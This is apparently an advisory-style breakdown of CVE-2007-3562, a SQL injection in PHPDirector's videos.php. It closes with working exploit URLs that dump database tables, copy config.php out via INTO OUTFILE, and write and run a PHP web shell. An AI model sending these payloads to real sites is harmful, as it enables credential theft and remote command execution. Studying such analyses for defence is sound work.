Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2007-3562:

**Vulnerability Details:**

*   **Root Cause:** SQL Injection vulnerability in the `videos.php` script of PHPDirector. The vulnerability is located in the handling of the `$id` parameter.

*   **Weaknesses/Vulnerabilities:**
    *   Unsanitized input: The application does not properly sanitize or validate user-supplied input to the `id` parameter in `videos.php`, allowing for the injection of arbitrary SQL code.

*   **Impact of Exploitation:**
    *   **Information Disclosure:** An attacker can use SQL injection to extract sensitive information from the database, such as database schema, usernames, passwords, and other confidential data. This is achieved by injecting `UNION SELECT` statements to query the database.
    *   **Remote Code Execution (RCE) / Arbitrary File Creation:** An attacker can use SQL injection to write files to the server using the `INTO OUTFILE` clause. This can lead to RCE by uploading a malicious PHP script.
    *   **Path disclosure**: The application discloses the full path of the application in error messages, which can be leveraged by an attacker to craft file upload attacks.
    *   **Credentials Exposure:** Admin and database credentials may be exposed by reading the `config.php` file.

*   **Attack Vectors:**
    *   The primary attack vector is via HTTP requests to `videos.php` with a manipulated `id` parameter.

*   **Required Attacker Capabilities/Position:**
    *   The attacker needs to be able to send HTTP requests to the vulnerable `videos.php` page. No authentication is required to exploit the vulnerability.

**Exploit Details:**

The provided exploit details from exploit-db include the following steps:

1.  **Path Disclosure:** The attacker first induces a path disclosure by submitting `http://www.site.com/videos.php?id[]=`

2.  **SQL Injection (Information Disclosure):**
    *   The attacker exploits the SQL Injection vulnerability by injecting a `UNION SELECT` query to extract data from the database
        `http://www.site.com/videos.php?id=-1%20UNION%20SELECT%20name,news,vids_per_page,version,template,6,7,8,9,10,11,12,13,14,15%20FROM%20pp_config`

3.  **Database Credentials Extraction:**
    *   The attacker then uses another SQL injection to read the `config.php` file using the `load_file()` function, storing the content of the file in `config.txt`, which can then be downloaded.
       `http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,load_file('[path_you_just_found]/config.php')%20FROM%20pp_config%20into%20outfile%20'[path_you_just_found]/config.txt'`

4.  **Remote Code Execution:**
    *   The attacker uses SQL injection to create a shell.php file and then triggers the execution of the injected PHP code to achieve RCE.
        `http://www.site.com/videos.php?id=-1%20UNION%20SELECT%201,'<?php%20system($_GET[cmd]);%20?>',3,4,5,6,7,8,9,10,11,12,13,14,15%20INTO%20OUTFILE%20'[path_founded]/shell.php'%20FROM%20pp_config`
        `http://www.site.com/shell.php?cmd=uname -a`

**Additional Notes:**

*   The exploit-db entry mentions other related CVEs ([CVE-2007-3530](https://nvd.nist.gov/vuln/detail/CVE-2007-3530) and [CVE-2007-3529](https://nvd.nist.gov/vuln/detail/CVE-2007-3529)), suggesting that multiple vulnerabilities may have been present in PHPDirector.

* The exploit-db entry notes the presence of default admin credentials in the config.php file.
